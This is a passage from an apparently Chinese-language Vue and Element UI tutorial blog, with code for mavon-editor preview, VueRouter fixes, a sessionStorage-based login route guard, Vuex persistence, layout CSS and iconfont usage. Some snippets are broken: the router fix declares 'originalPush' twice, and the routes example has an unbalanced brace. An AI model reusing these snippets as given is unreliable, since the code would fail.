class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">template中使用该组件： :value是要展示的markdown格式内容</span><br><span class="line">&lt;mavon-editor</span><br><span class="line">    :value=<span class="string">&quot;this.blog.content&quot;</span></span><br><span class="line">    :subfield=<span class="string">&quot;prop.subfield&quot;</span></span><br><span class="line">    :defaultOpen=<span class="string">&quot;prop.defaultOpen&quot;</span></span><br><span class="line">    :toolbarsFlag=<span class="string">&quot;prop.toolbarsFlag&quot;</span></span><br><span class="line">    :editable=<span class="string">&quot;prop.editable&quot;</span></span><br><span class="line">    :scrollStyle=<span class="string">&quot;prop.scrollStyle&quot;</span></span><br><span class="line">&gt;&lt;/mavon-editor&gt;</span><br><span class="line"></span><br><span class="line">script中添加该组件相关的计算属性：</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="title function_">prop</span> () &#123;</span><br><span class="line">      <span class="keyword">let</span> data = &#123;</span><br><span class="line">        <span class="attr">subfield</span>: <span class="literal">false</span>,<span class="comment">// 单双栏模式</span></span><br><span class="line">        <span class="attr">defaultOpen</span>: <span class="string">&#x27;preview&#x27;</span>,<span class="comment">//edit： 默认展示编辑区域 ， preview： 默认展示预览区域</span></span><br><span class="line">        <span class="attr">editable</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">toolbarsFlag</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">scrollStyle</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> data</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p><a href="https://github.com/hinesboy/mavonEditor">更多配置看mavonEditor的Github</a></p><hr><h2 id="Element-UI导航菜单组件双击报错解决"><a href="#Element-UI导航菜单组件双击报错解决" class="headerlink" title="Element UI导航菜单组件双击报错解决"></a>Element UI导航菜单组件双击报错解决</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//导航菜单组件双击报错解决</span></span><br><span class="line"><span class="keyword">const</span> originalPush = <span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span></span><br><span class="line"><span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span> = <span class="keyword">function</span> <span class="title function_">push</span>(<span class="params">location</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> originalPush.<span class="title function_">call</span>(<span class="variable language_">this</span>, location).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> err)</span><br><span class="line">&#125;<span class="keyword">const</span> originalPush = <span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span></span><br><span class="line"><span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span> = <span class="keyword">function</span> <span class="title function_">push</span>(<span class="params">location</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> originalPush.<span class="title function_">call</span>(<span class="variable language_">this</span>, location).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="前端路由权限拦截"><a href="#前端路由权限拦截" class="headerlink" title="前端路由权限拦截"></a>前端路由权限拦截</h2><ul><li>我们后台的操作界面需要登录后才可以访问，所以我们在路由映射的meta里配置该路由是否需要权限才能访问：<strong>requireAuth： true&#x2F;false</strong></li><li>用户登录成功时通过设置sessionStorage（存储客户端临时信息的对象）标志该用户已登录：<code>sessionStorage.setItem(&#39;isLogin&#39;,true)</code>。</li><li>一旦所有窗口或标签页被关闭，那么所有通过sessionStorage存储的数据也就被清空了。</li><li>通过<strong>全局前置守卫</strong>，判断每次将要进入的路由是否需要权限，如果不需要权限或需要权限且已经登录，那么直接放行，否则重定向到登录页面。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  ...</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../views/Login&quot;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;管理员登录&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/manage&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../views/Manage&quot;</span>),</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="attr">redirect</span>: <span class="string">&#x27;editTable&#x27;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;editTable&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/EditTable&quot;</span>),</span><br><span class="line">        <span class="attr">meta</span>: &#123;</span><br><span class="line">          <span class="attr">title</span>: <span class="string">&quot;后台管理&quot;</span>,</span><br><span class="line">          <span class="attr">requireAuth</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//路由权限拦截</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (to.<span class="property">meta</span>.<span class="property">requireAuth</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> isLogin = <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;isLogin&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (isLogin) &#123;</span><br><span class="line">      <span class="title function_">next</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">next</span>(&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><hr><p>为了优化用户体验，避免多次登录，我们可以设置跳转登录页面的方法为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;isLogin&quot;</span>))&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/manage&#x27;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="一刷新页面vuex的state数据丢失"><a href="#一刷新页面vuex的state数据丢失" class="headerlink" title="一刷新页面vuex的state数据丢失"></a>一刷新页面vuex的state数据丢失</h2><p>因为store里的数据是保存在运行内存中的,当页面刷新时，页面会重新加载vue实例，store里面的数据就会被重新赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  created() &#123;</span><br><span class="line">    //在页面加载时读取sessionStorage里的状态信息</span><br><span class="line">    if (sessionStorage.getItem(&quot;store&quot;)) &#123;</span><br><span class="line">      this.$store.replaceState(Object.assign(&#123;&#125;, this.$store.state, JSON.parse(sessionStorage.getItem(&quot;store&quot;))))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //在页面刷新时将vuex里的信息保存到sessionStorage里</span><br><span class="line">    window.addEventListener(&quot;beforeunload&quot;, () =&gt; &#123;</span><br><span class="line">      sessionStorage.setItem(&quot;store&quot;, JSON.stringify(this.$store.state))</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html, body &#123;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">  height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Element-侧边栏、头部固定"><a href="#Element-侧边栏、头部固定" class="headerlink" title="Element 侧边栏、头部固定"></a>Element 侧边栏、头部固定</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-container&gt;</span><br><span class="line">  &lt;el-header&gt;Header&lt;/el-header&gt;</span><br><span class="line">  &lt;el-container&gt;</span><br><span class="line">    &lt;el-aside width=&quot;200px&quot;&gt;Aside&lt;/el-aside&gt;</span><br><span class="line">    &lt;el-main&gt;Main&lt;/el-main&gt;</span><br><span class="line">  &lt;/el-container&gt;</span><br><span class="line">&lt;/el-container&gt;</span><br></pre></td></tr></table></figure><p>布局如上，要求当<strong>el-main</strong>长度过长时可以滚动，但是顶部和侧边固定，添加如下样式即可：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.el-aside</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">60px</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.el-main</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">60px</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow-y</span>: scroll;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Element-路由刷新和导航栏菜单状态保持一致"><a href="#Element-路由刷新和导航栏菜单状态保持一致" class="headerlink" title="Element 路由刷新和导航栏菜单状态保持一致"></a>Element 路由刷新和导航栏菜单状态保持一致</h2><p>当网页刷新或回退时，导航栏的当前激活菜单与路由地址不匹配。我们可以通过<strong>侦听器（watch）</strong>侦听路由地址的变化使它们一致：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;el-menu</span><br><span class="line">        :default-active=&quot;activeIndex&quot;</span><br><span class="line">        router</span><br><span class="line">        class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">    &gt;</span><br><span class="line">      &lt;el-menu-item index=&quot;/center/homePage&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-s-home&quot;/&gt;</span><br><span class="line">        &lt;span slot=&quot;title&quot;&gt;首页&lt;/span&gt;</span><br><span class="line">      &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;el-menu-item index=&quot;/center/notesPage&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-notebook-2&quot;/&gt;</span><br><span class="line">        &lt;span slot=&quot;title&quot;&gt;笔记&lt;/span&gt;</span><br><span class="line">      &lt;/el-menu-item&gt;</span><br><span class="line">    &lt;/el-menu&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;SideBar&quot;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      activeIndex: &quot;/center/homePage&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    $route () &#123;</span><br><span class="line">      this.setCurrentRoute()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    setCurrentRoute () &#123;</span><br><span class="line">      this.activeIndex = this.$route.path</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    this.setCurrentRoute()</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>另外一种，适用于一个菜单包含多个地址的，比较实用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;el-menu</span><br><span class="line">        :default-active=&quot;activeIndex&quot;</span><br><span class="line">        class=&quot;el-menu-vertical-demo&quot;&gt;</span><br><span class="line">      &lt;el-menu-item index=&quot;1&quot; @click=&quot;toHomePage&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-s-home&quot;/&gt;</span><br><span class="line">        &lt;span slot=&quot;title&quot;&gt;首页&lt;/span&gt;</span><br><span class="line">      &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;el-menu-item index=&quot;2&quot; @click=&quot;toCoursePage&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-reading&quot;/&gt;</span><br><span class="line">        &lt;span slot=&quot;title&quot;&gt;课程&lt;/span&gt;</span><br><span class="line">      &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;el-menu-item index=&quot;3&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-message-solid&quot;/&gt;</span><br><span class="line">        &lt;span slot=&quot;title&quot;&gt;通知&lt;/span&gt;</span><br><span class="line">      &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;el-menu-item index=&quot;4&quot; @click=&quot;toNotesPage&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-notebook-2&quot;/&gt;</span><br><span class="line">        &lt;span slot=&quot;title&quot;&gt;笔记&lt;/span&gt;</span><br><span class="line">      &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;el-menu-item index=&quot;5&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-chat-dot-square&quot;/&gt;</span><br><span class="line">        &lt;span slot=&quot;title&quot;&gt;讨论&lt;/span&gt;</span><br><span class="line">      &lt;/el-menu-item&gt;</span><br><span class="line">    &lt;/el-menu&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;SideBar&quot;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      activeIndex: &#x27;1&#x27;,</span><br><span class="line">      path: &#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    setCurrentRoute() &#123;</span><br><span class="line">      this.path = this.$route.path</span><br><span class="line">      if (this.path === &#x27;/center/homePage&#x27;) &#123;</span><br><span class="line">        this.activeIndex = &#x27;1&#x27;</span><br><span class="line">      &#125; else if (this.path === &#x27;/center/course&#x27;) &#123;</span><br><span class="line">        this.activeIndex = &#x27;2&#x27;</span><br><span class="line">      &#125; else if (this.path.includes(&#x27;ote&#x27;)) &#123;</span><br><span class="line">        this.activeIndex = &#x27;4&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    toHomePage() &#123;</span><br><span class="line">      this.$router.push(&#x27;/center/homePage&#x27;)</span><br><span class="line">    &#125;,</span><br><span class="line">    toCoursePage() &#123;</span><br><span class="line">      this.$router.push(&#x27;/center/course&#x27;)</span><br><span class="line">    &#125;,</span><br><span class="line">    toNotesPage() &#123;</span><br><span class="line">      this.$router.push(&#x27;/center/notesPage&#x27;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    $route() &#123;</span><br><span class="line">      this.setCurrentRoute()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  created() &#123;</span><br><span class="line">    this.setCurrentRoute()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Element中竖向分割线长度调整"><a href="#Element中竖向分割线长度调整" class="headerlink" title="Element中竖向分割线长度调整"></a>Element中竖向分割线长度调整</h2><p>f12检查元素，复制样式到vue文件中进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;style scoped&gt;</span><br><span class="line">.el-divider--vertical &#123;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  width: 1px;</span><br><span class="line">  height: 9em;</span><br><span class="line">  margin: 0 8px;</span><br><span class="line">  vertical-align: middle;</span><br><span class="line">  position: relative;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="在Vue中使用阿里矢量图标"><a href="#在Vue中使用阿里矢量图标" class="headerlink" title="在Vue中使用阿里矢量图标"></a>在Vue中使用阿里矢量图标</h2><p><a href="https://www.iconfont.cn/">https://www.iconfont.cn/</a></p><ol><li><p>将想要的图标添加至自己的项目中，在项目里点击symbol，查看在线链接，例如：<code>//at.alicdn.com/t/font_2372769_xa9myt9i5o.js</code></p></li><li><p>浏览器访问该链接，在项目src&#x2F;assets下新建iconfont.js文件，并将所有代码复制到js文件中</p></li><li><p>在App.vue中引入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">import &#x27;./assets/iconfont.js&#x27;</span><br><span class="line">...</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.icon &#123;</span><br><span class="line">  width: 1em;</span><br><span class="line">  height: 1em;</span><br><span class="line">  vertical-align: -0.15em;</span><br><span class="line">  fill: currentColor;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg class=&quot;icon&quot; aria-hidden=&quot;true&quot; style=&quot;font-size: 33px&quot;&gt;</span><br><span class="line">  &lt;use xlink:href=&quot;#icon-gonggao1&quot;&gt;&lt;/use&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8d11a391&helptype=code">官方文档</a>的symbol方式如下：</p><blockquote><p>symbol引用</p><hr><p>这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇<a href="https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8d11a391&helptype=code">文章</a> 这种用法其实是做了一个svg的集合，与上面两种相比具有如下特点：</p><ul><li>支持多色图标了，不再受单色限制。</li><li>通过一些技巧，支持像字体那样，通过<code>font-size</code>,<code>color</code>来调整样式。</li><li>兼容性较差，支持 ie9+,及现代浏览器。</li><li>浏览器渲染svg的性能一般，还不如png。</li></ul><p>使用步骤如下：</p><p><strong>第一步：拷贝项目下面生成的symbol代码：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js</span></span><br></pre></td></tr></table></figure><p><strong>第二步：加入通用css代码（引入一次就行）：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">   <span class="selector-class">.icon</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">width</span>: <span class="number">1em</span>; <span class="attribute">height</span>: <span class="number">1em</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">vertical-align</span>: -<span class="number">0.15em</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">fill</span>: currentColor;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">overflow</span>: hidden;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">   &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>第三步：挑选相应图标并获取类名，应用于页面：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">&quot;#icon-xxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">use</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&gt;<span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br></pre></td></tr></table></figure></blockquote><h2 id="Element-中修改默认样式无效"><a href="#Element-中修改默认样式无效" class="headerlink" title="Element 